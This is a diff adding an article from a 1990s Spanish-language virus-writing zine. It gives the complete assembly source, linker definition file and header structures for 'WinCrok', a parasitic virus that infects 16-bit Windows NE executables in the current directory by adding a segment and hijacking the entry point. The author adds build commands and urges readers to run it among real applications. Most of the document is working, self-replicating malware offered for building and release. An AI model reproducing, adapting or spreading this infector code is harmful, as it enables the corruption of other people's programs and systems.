@@ -1,0 +1,819 @@
+MINOTAURO MAGAZINE #11
+
+                               Virus WinCrok
+                        Ejemplo de infeccion de NE
+                                 por Trurl
+
+     El proposito de este virus es ilustrar la nota de infeccion de NE que
+acompa¤a a esta edicion. Por lo tanto la explicacion del funcionamiento va
+a ser bastante elemental. Cualquier tipo de duda sobre como funciona,
+acudir a la nota de infeccion de NE, o a la especificacion del formato. Si
+aun asi no se soluciona, mandennos un mensaje en algun lado (y haganse
+ver).
+
+     El modo de encontrar hosts no podria ser mas estupido y basico; se
+trata del metodo de todos los virus runtime, que es el de buscar en el
+directorio actual (sin ningun refinamiento; no busca en el directorio
+parent ni recursa los subdirectorios, ni nada).
+
+     La infeccion en si se da de la siguiente manera. El virus para hacer
+espacio en la segment table, usa el metodo de bajar todas las tablas que
+esten despues de esta. Antes de hacer nada verifica que haya espacio de
+donde sacar, y esto lo hace primero obteniendo el largo de la nonresident-
+names table, y luego el offset absoluto del primer segmento del host. Si
+existe espacio, baja todo lo que haya despues de la segment table exacta-
+mente ocho bytes, ya que solo inserta una entrada. Luego de moverlo,
+actualiza los offsets de todas las tablas que hayan sido movidas. El virus
+consta de un solo segmento.
+
+     Precisamente por esta razon, el virus necesita algun modo de hacer que
+su segmento de codigo sea escribible. Para lograr esto, lo que hace el
+virus es obtener un alias del segmento de codigo, pero como segmento de
+datos escribible y leible. Esto se hace utilizando tres APIs de Windows:
+AllocSelector, PrestoChangoSelector y FreeSelector. Estas APIs estan dentro
+del modulo KERNEL; por lo tanto el virus necesita asegurarse de que el host
+importa el modulo KERNEL. Al verificar que KERNEL se encuentre importado,
+guarda su indice dentro de la module reference table, y luego usa este
+indice para modificar sus propias tablas de realocacion y lograr que las
+APIs sean realocadas correctamente dentro de cada host que infecta. La otra
+realocacion es el salto al host, que es modificado para que sea realocada
+apuntando al CS:IP original del host. 
+
+     No existe ninguna marca de infeccion previa. El virus identifica
+ejecutables ya infectados cuando encuentra que tienen un segmento del largo
+exacto del segmento del virus (en memoria); el segmento del virus agrega un
+peque¤o espacio para "heap" para alli poner las variables no inicializadas,
+y de este modo bajar el largo de infeccion.
+
+--- WINCROK.ASM : cut here --------------------------------------------------
+; Virus WinCrok v1.3 por Trurl tgc
+; Infector parasitico de NE, no residente
+; Fecha: febrero/97
+; Largo del codigo: 401 (1025) bytes
+; (largo agregado a hosts varia debido al redondeo al agregar el segmento)
+
+; ensamblar con:
+;  tasm /ml /m3 /iC:\TASM\INCLUDE wincrok.asm
+;  tlink /P- /Twe wincrok.obj,, import.lib, wincrok.def
+; luego ponerlo en el mismo directorio con algunas aplicaciones Windows
+; de 16 bits, correrlo, y a gozar!
+
+	locals
+	jumps
+	.model large, WINDOWS PASCAL
+	.SEQ
+	.386
+
+include windows.inc ; esta en C:\TASM\INCLUDE
+include winstruc.inc
+
+extrn ALLOCSELECTOR:PROC
+extrn PRESTOCHANGOSELECTOR:PROC
+extrn FREESELECTOR:PROC
+
+; Estos dos segmentos solo son el carrier, ignorarlos..
+dumb_data_segment segment byte public 'DATA' use16
+; segmento necesario para el carrier.
+; sin segmento de datos en el carrier, no hay stack, no hay un catzo...
+	db 16 dup(0)
+	; un poco de espacio como para decir la puta hay algo adentro che
+	db	200h dup(0)
+ends dumb_data_segment
+
+host_code segment byte public 'CODE' use16
+; fake host del carrier
+assume cs:host_code
+host_ep label far
+	mov ax, 4c00h
+	int 21h
+ends host_code
+
+
+; He aqui el codigo del virus..
+
+virus_code segment byte public 'CODE' use16
+CODE_SIZE	=	code_end - code_start	; largo del codigo (viajante)
+HEAP_SIZE	=  _heap_end - code_start	; largo del codigo + heap
+assume cs:virus_code, ds:virus_code
+
+code_start:
+VirMain proc NEAR
+	pusha
+	push ds es
+
+	; conseguir todos nuestros segmentos
+	push cs
+allocselector_api_call = $ + 1
+	call ALLOCSELECTOR
+	; ax = selector alocado
+
+	push cs
+	push ax
+prestochango_api_call = $ + 1
+	call PRESTOCHANGOSELECTOR
+	mov ds, ax
+
+	; salvar el address original de DTA
+	mov ah, 2fh
+	int 21h
+	push es bx
+	push ds
+	pop es
+
+	; reapuntar el DTA al segmento del virus
+	mov dx, offset acDTA
+	mov ah, 1ah
+	int 21h
+
+	; buscar los files
+	mov ah, 4eh
+	mov dx, offset szMask
+	mov cx, 6
+
+@@findnext:
+	int 21h
+	jc @@no_more_files
+	; se encontro un file? -> infectarlo
+
+	mov dx, offset szFileName
+	call InfectNE
+
+	mov ah, 4fh
+	jmp @@findnext
+
+@@no_more_files:
+	; no hay mas files
+
+	; liberar el selector que alocamos
+	push ds
+	xor ax, ax
+	mov ds, ax
+	mov es, ax
+freeselector_api_call = $ + 1
+	call FREESELECTOR
+
+	; reapuntar el DTA al address original
+	pop dx ds
+	mov ah, 1ah
+	int 21h
+
+	; devolver control al host
+	pop es ds
+	popa
+
+jmp_to_host_reference equ $ + 1
+	jmp host_ep
+endp VirMain
+
+InfectNE proc near
+; IN: ds:dx = File Name
+; OUT: file infected..
+; asume que DS apunta al codigo del virus
+	pusha
+
+	;< abrir el file >
+	mov ax, 3d02h
+	int 21h
+	jc @@no_infection
+	mov bx, ax
+
+	;< verificar que sea NE >
+	;leer el MZ
+	mov ah, 3fh
+	mov cx, 40h
+	mov dx, offset acHeader
+	int 21h
+
+	;verificar que sea MZ
+	cmp acHeader.D_Signature, 'ZM'
+	jnz @@abort_infect
+
+	;verificar que el header size no sea menor a 4 paras
+	cmp acHeader.D_HeaderSize, 4
+	jb @@abort_infect
+
+	;verificar que la realoc table del MZ no empiece antes de 40h
+	cmp acHeader.D_RealocTblOff, 40h
+	jb @@abort_infect
+
+	;leer el NE
+	mov ax, 4200h
+	mov dx, word ptr acHeader.D_NEOffset
+	mov cx, word ptr acHeader.D_NEOffset + 2
+	mov word ptr lNEOffset, dx
+	mov word ptr lNEOffset+2, cx
+	int 21h
+
+	mov ah, 3fh
+	mov cx, 40h
+	mov dx, offset acHeader
+	int 21h
+
+	;verificar que sea NE
+	cmp acHeader.W_Signature, 'EN'
+	jnz @@abort_infect
+
+	;< verificar que importe KERNEL y obtener su indice >
+	;ir a la module reference table
+	xor cx, cx
+	mov dx, acHeader.W_ModTblOff
+	call CalcNEOffset
+	mov ax, 4200h
+	int 21h
+
+	;leerla completa
+	mov ah, 3fh
+	mov dx, offset acBuffer
+	mov cx, acHeader.W_ModTblCount
+	shl cx, 1
+	int 21h
+
+	;< para cada module importado >
+	mov cx, acHeader.W_ModTblCount
+	mov si, offset acBuffer
+	mov di, cx
+	shl di, 1
+	add di, si
+	; los modulos son 1-based
+	xor bp, bp
+	inc bp
+
+@@next_imported_name:
+	; ir al offset de la entrada del modulo
+	push cx
+	xor cx, cx
+	mov dx, acHeader.W_INameTblOff
+	add dx, word ptr [si]
+	call CalcNEOffset
+	mov ax, 4200h
+	int 21h
+
+	; leer un byte
+	mov ah, 3fh
+	mov cx, 1
+	mov dx, di
+	int 21h
+
+	; es igual a strlen("KERNEL");?
+	cmp byte ptr [di], 6
+	; no -> continuar con el siguiente imported module
+	jnz @@continue_kernel_search
+	; si -> compararlo con "KERNEL"
+
+	; leer los 6 bytes
+	mov ah, 3fh
+	mov cx, 6
+	mov dx, di
+	int 21h
+
+	; son iguales a KERNEL?
+	push si di
+	mov si, offset szKernelName
+	mov cx, 6
+	rep cmpsb
+	pop di si
+	; no -> continuar con el siguiente imported module
+	jnz @@continue_kernel_search
+	; si -> encontrado
+	pop cx
+	jmp @@kernel_found
+
+@@continue_kernel_search:
+	inc si
+	inc si
+	inc bp
+	pop cx
+	loop @@next_imported_name
+
+	; no se encontro KERNEL, imposible la infeccion
+	jmp @@abort_infect
+
+@@kernel_found:
+	mov nKernelIndex, bp
+
+	;< verificar que la NRN sea la ultima tabla >
+	;< sacar el offset mayor de todas las tablas que no son la NRN table >
+	;< para cada tabla >
+	mov cx, TABLE_COUNT
+	mov si, offset nTableOffset
+	xor bp, bp
+
+@@next_table:
+	;el offset de esta tabla es mayor al encontrado hasta ahora?
+	mov di, [si]
+	mov di, word ptr acHeader+di
+	cmp di, bp
+	; no -> seguir
+	jna @@continue_table
+	; si -> registrarlo
+	mov bp, di
+@@continue_table:
+	inc si
+	inc si
+	loop @@next_table
+
+	;< el offset de la tabla mayor es mayor al de le NRN table ? >
+	mov dx, bp
+	xor cx, cx
+	call CalcNEOffset
+
+	; si -> imposible la infeccion
+	cmp cx, word ptr acHeader.W_NRNTblOff+2
+	ja @@abort_infect
+	cmp dx, word ptr acHeader.W_NRNTblOff
+	jae @@abort_infect
+
+	; < verificar que haya espacio >
+
+	; < obtener el largo de la NRN >
+	mov bp, acHeader.W_NRNTblLen
+	; BP!! contiene el size de la NRN table
+	push bp
+
+	; < obtener el offset del primer segmento despues del NE >
+	; ir a la segment table
+	mov dx, acHeader.W_SegmTblOff
+	xor cx, cx
+	call CalcNEOffset
+	mov ax, 4200h
+	int 21h
+
+	; < para cada entrada de la segment table >
+	xor bp, bp
+	dec bp
+	mov cx, acHeader.W_SegmTblCount
+
+@@next_find_segment:
+	push cx
+
+	; leer la entrada de segmento
+	mov ah, 3fh
+	mov cx, 8 ; 4
+	mov dx, offset acBuffer
+	int 21h
+
+	; CHEQUEO DE INFECCION PREVIA
+	cmp word ptr acBuffer.SegmentMinAlloc, HEAP_SIZE
+	jnz @@not_infected
+	; en la stack estaba ..
+	pop cx ; .. el counter de este loop
+	pop bp ; .. y el largo de la NRN
+	jmp @@abort_infect
+@@not_infected:
+	; si es mayor, guardarlo
+	cmp word ptr acBuffer, 0
+	jz @@continue_find_segment
+	cmp bp, word ptr acBuffer
+	jb @@continue_find_segment
+
+	mov bp, word ptr acBuffer
+
+@@continue_find_segment:
+	pop cx
+	loop @@next_find_segment
+
+	; < restar el offset del primer segmento, menos el offset del fin de >
+	; < la NRN table >
+	mov ax, bp
+	xor dx, dx
+	call ShiftLeftNE
+	; dx.ax = offset del 1er segmento
+
+	pop si
+	xor di, di
+	add si, word ptr acHeader.W_NRNTblOff
+	adc di, word ptr acHeader.W_NRNTblOff+2
+	; di.si = offset del fin de la NRN table
+	push di si
+
+	; si el offset del primer segmento es menor al offset del fin de
+	; la NRN table, no se puede infectar
+	cmp di, dx
+	ja @@abort_infect
+	cmp si, ax
+	ja @@abort_infect
+
+	; hacer la resta
+	sub dx, di
+	sbb ax, si
+
+	or dx, cx
+	jnz @@enough_space
+	cmp ax, 8
+	jb @@abort_infect
+@@enough_space:
+
+	; < mover las tablas despues de la segment table para hacer espacio >
+	; calcular cuanto hay que mover
+	pop si di
+	push di si
+	; bx.ax = fin de NRN table
+
+	mov dx, acHeader.W_SegmTblOff
+	mov cx, acHeader.W_SegmTblCount
+	shl cx, 3
+	add dx, cx
+	xor cx, cx
+	call CalcNEOffset
+	; cx.dx = fin de segment table
+
+	sub di, cx
+	sub si, dx
+
+	; si hay que mover demasiado, abortar
+	or di, di
+	jnz @@abort_infect
+	cmp si, MAX_MOVE
+	jnb @@abort_infect
+
+
+	; mover...
+	mov cx, si
+	pop si di
+	; di.si = fin de NRN table
+	mov bp, BUFFER_SIZE
+	; cx = lo que falta mover
+	; bp = la cantidad que hay que mover en esta vuelta
+	; di.si = offset actual
+@@next_move:
+	jcxz @@finished_move
+	cmp cx, BUFFER_SIZE
+	jnb @@normal_move
+	mov bp, cx
+
+@@normal_move:
+	sub si, bp
+	sbb di, 0
+	push cx
+
+	mov ax, 4200h
+	mov cx, di
+	mov dx, si
+	int 21h
+
+	mov ah, 3fh
+	mov cx, bp
+	mov dx, offset acBuffer
+	int 21h
+
+	mov ax, 4200h
+	mov cx, di
+	mov dx, si
+	add dx, TABLE_SPACE
+	adc cx, 0
+	int 21h
+
+	mov ah, 40h
+	mov cx, bp
+	mov dx, offset acBuffer
+	int 21h
+
+	pop cx
+	sub cx, bp
+	jmp @@next_move
+@@finished_move:
+
+	; updatear todas las tablas que hayan sido movidas
+	mov cx, TABLE_COUNT
+	mov si, offset nTableOffset
+	mov bp, acHeader.W_SegmTblOff
+
+@@next_fix_table:
+	mov di, [si]
+	mov ax, word ptr acHeader+di
+	cmp ax, bp
+	jna @@no_fix_table
+	add ax, TABLE_SPACE
+	mov word ptr acHeader+di, ax
+@@no_fix_table:
+	inc si
+	inc si
+	loop @@next_fix_table
+
+	add word ptr acHeader.W_NRNTblOff, TABLE_SPACE
+	adc word ptr acHeader.W_NRNTblOff, 0
+
+	; < crear la entrada de segment table >
+	; ir al fin de file
+	mov ax, 4202h
+	xor cx, cx
+	cwd
+	int 21h
+	; calcular el offset del segmento
+	call OffsetToSector
+	; armar la entrada
+	mov segEntry.SegmentOff, ax
+
+	;< escribirla >
+	mov ax, 4200h
+	mov dx, acHeader.W_SegmTblCount
+	shl dx, 3
+	add dx, acHeader.W_SegmTblOff
+	xor cx, cx
+	call CalcNEOffset
+	int 21h
+
+	mov ah, 40h
+	mov dx, offset segEntry
+	mov cx, 8
+	int 21h
+
+	; e incrementar el nro de segmentos
+	inc acHeader.W_SegmTblCount
+
+	;< escribir el segmento >
+	; ir a la posicion
+	mov ax, segEntry.SegmentOff
+	call ShiftLeftNE
+	mov cx, dx
+	mov dx, ax
+	mov ax, 4200h
+	int 21h
+
+	; antes de escribi el codigo, hay que poner en todas las llamadas
+	; que van a ser realocadas (APIs, salto al host) los valores 0, FFFF
+	; para que Windows las pueda realocar.
+	; Cuando haya que usar muchas APIs esto podra ser hecho en forma
+	; generica mientras se modifican las realocaciones pero por ahora lo
+	; hacemos caso por caso y aca
+	push word ptr allocselector_api_call
+	push word ptr allocselector_api_call+2
+	mov word ptr allocselector_api_call, 0
+	mov word ptr allocselector_api_call+2, 0ffffh
+
+	push word ptr prestochango_api_call
+	push word ptr prestochango_api_call+2
+	mov word ptr prestochango_api_call, 0
+	mov word ptr prestochango_api_call+2, 0ffffh
+
+	push word ptr freeselector_api_call
+	push word ptr freeselector_api_call+2
+	mov word ptr freeselector_api_call, 0
+	mov word ptr freeselector_api_call+2, 0ffffh
+
+	push word ptr jmp_to_host_reference
+	push word ptr jmp_to_host_reference+2
+	mov word ptr jmp_to_host_reference, 0
+	mov word ptr jmp_to_host_reference+2, 0ffffh
+
+	; escribir el codigo
+	mov ah, 40h
+	mov dx, offset VirMain
+	mov cx, CODE_SIZE
+	int 21h
+
+	; y ahora restaurar el codigo
+	pop word ptr jmp_to_host_reference+2
+	pop word ptr jmp_to_host_reference
+
+	pop word ptr freeselector_api_call+2
+	pop word ptr freeselector_api_call
+
+	pop word ptr prestochango_api_call+2
+	pop word ptr prestochango_api_call
+
+	pop word ptr allocselector_api_call+2
+	pop word ptr allocselector_api_call
+
+	; < fixear la realoc table >
+	mov ax, acHeader.W_OrigCS
+	mov byte ptr seg_host, al
+	mov ax, acHeader.W_OrigIP
+	mov off_host, ax
+
+	mov ax, nKernelIndex
+	mov krnl_index1, ax
+	mov krnl_index2, ax
+	mov krnl_index3, ax
+
+	; < escribir la realoc table >
+	mov ah, 40h
+	mov dx, offset realocTable
+	mov cx, realocTableEnd - realocTable
+	int 21h
+
+	;< escribi el NE modificado >
+
+	; modificar el CS:IP
+	mov ax, acHeader.W_SegmTblCount
+	mov acHeader.W_OrigCS, ax
+	mov ax, offset VirMain
+	mov acHeader.W_OrigIP, ax
+
+	; sacar la flag de PRELOAD si la tiene
+	mov al, acHeader.W_Info
+	and al, 0f7h
+	mov acHeader.W_Info, al
+
+	mov ax, 4200h
+	mov dx, word ptr lNEOffset
+	mov cx, word ptr lNEOffset+2
+	int 21h
+	mov ah, 40h
+	mov cx, 40h
+	mov dx, offset acHeader
+	int 21h
+
+	;< listo! >
+
+@@abort_infect:
+	mov ah, 3eh
+	int 21h
+@@no_infection:
+	popa
+	ret
+
+InfectNE endp
+
+CalcNEOffset proc NEAR
+; Calcula un offset relativo a NE usando la variable global lNEOffset
+; IN: cx.dx = offset relativo a NE
+; OUT: cx.dx = offset relativo a principio de file
+	add dx, word ptr lNEOffset
+	adc cx, word ptr lNEOffset+2
+	ret
+CalcNEOffset endp
+
+ShiftLeftNE proc NEAR
+; shiftlefts un offset dentro del NE
+; IN: ax = offset en sectores
+; OUT: dx.ax = offset en bytes relativo a principio del file
+	xor dx, dx
+	mov cx, acHeader.W_ShiftCount
+@@next_shl:
+	clc
+	sal ax, 1
+	rcl dx, 1
+	loop @@next_shl
+	ret
+ShiftLeftNE endp
+
+OffsetToSector proc NEAR
+; Traduce de Offset plano a offset en sectores
+; IN: dx.ax = offset sin redondear
+; OUT: dx = offset redondeado y shiftlefteado
+	push bx cx
+
+
+	push dx ax
+	mov ax, 1
+	call ShiftLeftNE
+	mov bx, ax
+	dec bx
+	mov cx, bx
+	not cx
+	pop ax dx
+
+	add ax, bx
+	adc dx, 0
+	and ax, cx
+
+	mov cx, acHeader.W_ShiftCount
+@@next_shr:
+	clc
+	sar dx, 1
+	rcr ax, 1
+	loop @@next_shr
+
+	pop cx bx
+	ret
+OffsetToSector endp
+
+; DATA AREA
+		db	"WinCrok Virus v1p3 by Trurl",0
+
+szMask		db	"*.EXE",0 ; mascara para busqueda de files
+szKernelName	db	"KERNEL"
+
+CODE_SIZE	=	code_end - code_start	; largo del codigo (viajante)
+TABLE_SPACE	=	8	; espacio a hacer en las tablas
+
+TABLE_COUNT	=	6
+nTableOffset	dw	22h, 24h, 26h, 28h, 2ah, 4
+
+
+; not preloaded segment..
+segEntry	SegmentTableEntry <0, CODE_SIZE, 1d10h, HEAP_SIZE>
+realocTable	dw	4
+
+		db	3, 4
+		dw	offset jmp_to_host_reference
+seg_host	dw	0 ; seg de host CS:IP
+off_host	dw	0 ; off del host CS:IP
+
+; Ven ahora porque era util la nota de "Numeros ordinales de APIs" de la
+; mino 10??? vean esos ordinales: AF, B1, B0....
+		db	3, 5
+		dw	offset allocselector_api_call
+krnl_index1	dw	0    ; index del kernel
+		dw	0AFh ; ALLOCSELECTOR ordinal
+
+		db	3, 5
+		dw	offset prestochango_api_call
+krnl_index2	dw	0	; index del kernel
+		dw	0B1H	; PRESTOCHANGOSELECTOR
+
+		db	3, 5
+		dw	offset freeselector_api_call
+krnl_index3	dw	0	; index del kernel
+		dw	0B0H	; FREESELECTOR
+realocTableEnd:
+code_end:
+nKernelIndex	dw	0
+acHeader	db	40h dup(0);
+lNEOffset	dd	0
+acDTA		db	30 dup(0) ; other info
+szFileName	db	13 dup(0) ; DTA filename
+
+BUFFER_SIZE	=	400h ; no puede ser menor a ocho, por lo menos, o mas
+acBuffer	db	BUFFER_SIZE dup(0);
+MAX_MOVE	=	(BUFFER_SIZE * 64)-1 ; nro de bytes maximo que se movera al hacer lugar (64k-1)
+
+_heap_end:
+ends virus_code
+
+end VirMain
+--- WINCROK.ASM : cut here --------------------------------------------------
+
+--- WINCROK.DEF : cut here --------------------------------------------------
+NAME         WINCROK
+
+DESCRIPTION  'Wincrok Virus 1.3 by Trurl'
+
+EXETYPE      WINDOWS
+
+HEAPSIZE     1024
+STACKSIZE    8192
+
+CODE         PRELOAD MOVEABLE DISCARDABLE
+DATA         LOADONCALL MOVEABLE MULTIPLE
+
+SEGMENTS
+	host_code CLASS 'CODE' MOVEABLE DISCARDABLE
+	virus_code CLASS 'CODE' MOVEABLE DISCARDABLE
+	dumb_data_segment CLASS 'DATA' MOVEABLE
+--- WINCROK.DEF : cut here --------------------------------------------------
+
+--- WINSTRUC.INC : cut here -------------------------------------------------
+DosExeHeader struc	; Header de EXE de DOS
+	D_Signature	dw	'ZM'; 00h : Signature for DOS header (MZ)
+	D_Reminder	dw	0	; 02h : Nr. of bytes in the last page
+	D_PageCount	dw	0	; 04h : Nr. of pages rounder up
+	D_RelocCount	dw	0	; 06h : Nr. of items in reloc table
+	D_HeaderSize	dw	0	; 08h : Header Size in paras including realoc table
+	D_MinAlloc	dw	0	; 0Ah : Minimum alloc (required)
+	D_MaxAlloc	dw	0	; 0Ch : Maximum alloc (desired, usualy ffff)
+	D_OrigSS	dw	0	; 0Eh : SS on start
+	D_OrigSP	dw	0	; 10h : SP on start
+	D_Checksum	dw	0	; 12h : Checksum for EXE (not used)
+	D_OrigIP	dw	0	; 14h : IP on start (ep)
+	D_OrigCS	dw	0	; 16h : CS on start (ep)
+	D_RealocTblOff	dw	0	; 18h : Offset to realoc table relative to begining of file
+	D_Overlay	dw	0	; 1Ah : Nr of overlays (not used)
+			dw	10h dup(0); 1Ch : Reserved space
+	D_NEOffset	dd	0	; 3Ch : Offset to NE header (if there is one)
+DosExeHeader ends
+
+WinExeHeader struc   ; Header de EXE de Windows
+	W_Signature	dw	0	; 00h : Signature for windows header (NE)
+	W_LinkerVer	dw	0	; 02h : Linker version (lo bytes is version nr., hi byte is revision nr.)
+	W_EntryTblOff	dw	0	; 04h : Offset of entry table relative to begining of header
+	W_EntryTblLen	dw	0	; 06h : Size of entry table in bytes
+	W_Reserved1	dw	0,0	; 08h	: CRC of entire file ?
+	W_Flags		dw	0	; 0Ch : Flags that describe the EXE
+	W_DataSegment	dw	0	; 0Eh : Automatic data segment number (is index in segment table)
+	W_HeapSize	dw	0	; 10h : Initial size of heap in bytes
+	W_StackSize	dw	0	; 12h : Initial size of stack in bytes
+	W_OrigIP	dw	0	; 14h : IP on start
+	W_OrigCS	dw	0	; 16h : Code segment
+	W_OrigSP	dw	0	; 18h : SP on start
+	W_OrigSS	dw	0	; 1Ah : Stack segment
+	W_SegmTblCount	dw	0	; 1Ch : Number of entries in the segment table
+	W_ModTblCount	dw	0	; 1Eh : Number of entries in the module-reference table
+	W_NRNTblLen	dw	0	; 20h : Number of bytes in the nonresident-name table
+	W_SegmTblOff	dw	0	; 22h : Offset of segment table relative to begining of header
+	W_ResTblOff	dw	0	; 24h : Offset of resource table relative to begining of header
+	W_RNTblOff	dw	0	; 26h : Offset of resident-name table relative to begining of header
+	W_ModTblOff	dw	0	; 28h : Offset of module-reference table relative to begining of header
+	W_INameTblOff	dw	0	; 2Ah : Offset of imported-name table relative to begining of header
+	W_NRNTblOff	dd	0	; 2Ch : Offset of nonresident-name table relative to begining of FILE
+	W_MoveEP	dw	0	; 30h	: Number of moveable entry points (?)
+	W_ShiftCount	dw	0	; 32h : Shift count used to align sectors
+	W_ResSegmCount	dw	0	; 34h : Number of resource segments
+	W_TargetOS	db	0	; 36h : Target operating system
+	W_Info		db	0	; 37h : Additional info
+	W_FastLoadOff	dw	0	; 38h : offset in sectors to the begining of the fastload area
+	W_FastLoadLen	dw	0	; 3Ah : length in sectors of the fast load area
+	W_Reserved2	dw	0	; 3Ch
+	W_WinVer	dw	0	; 3Eh : Expected windows version
+WinExeHeader ends
+
+SegmentTableEntry struc		; Entrada de la Segment Table
+	SegmentOff	dw	0	; 0h : Offset in segments to the segment data
+	SegmentLen	dw	0	; 2h : Size of segment in bytes
+	SegmentType	dw	0	; 4h : flags for segment type
+	SegmentMinAlloc	dw	0	; 6h : minimum allocation size
+SegmentTableEntry ends
+--- WINSTRUC.INC : cut here ---------------------------------------------------
+
+									 Trurl
